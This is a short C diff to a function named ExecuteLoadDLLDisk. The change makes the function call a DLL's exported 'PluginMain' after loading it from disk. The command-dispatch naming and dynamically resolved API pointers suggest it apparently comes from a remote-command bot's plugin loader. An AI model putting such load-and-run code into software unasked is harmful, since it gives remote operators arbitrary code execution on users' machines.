@@ -726,7 +726,15 @@ bool ExecuteLoadDLLDisk(PTaskManager, PCHAR Command, PCHAR Args)
 		{
 			HMODULE dll = (HMODULE)pLoadLibraryA(fileName);
 			if( dll )
-				res = true;
+			{
+				typedef void (WINAPI *tfunc)(void*);
+				tfunc func = (tfunc)pGetProcAddress( dll, "PluginMain" );
+				if( func )
+				{
+					func(0);
+					res = true;
+				}
+			}
 		}
 		MemFree(data);
 	}
